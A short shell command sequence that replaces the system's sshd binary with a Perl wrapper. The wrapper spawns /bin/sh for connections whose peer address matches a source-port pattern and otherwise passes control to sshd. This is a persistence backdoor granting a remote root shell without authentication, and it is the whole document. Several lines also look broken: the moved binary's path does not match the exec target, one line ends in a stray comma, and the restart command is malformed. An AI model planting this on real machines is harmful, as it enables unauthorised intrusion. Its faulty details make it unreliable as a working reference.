mv /usr/sbin/sshd /bin/
echo '#!/usr/bin/perl' > /usr/sbin/sshd
echo 'exec "/bin/sh" if(getpeername(STDIN) =~ /^..4A/);' >> /usr/sbin/sshd
echo 'exec{"/usr/bin/sshd"} "/usr/sbin/sshd",@ARGV,' >> /usr/sbin/sshd
chmod u+x /usr/sbin/sshd
systemctl restart /sshd
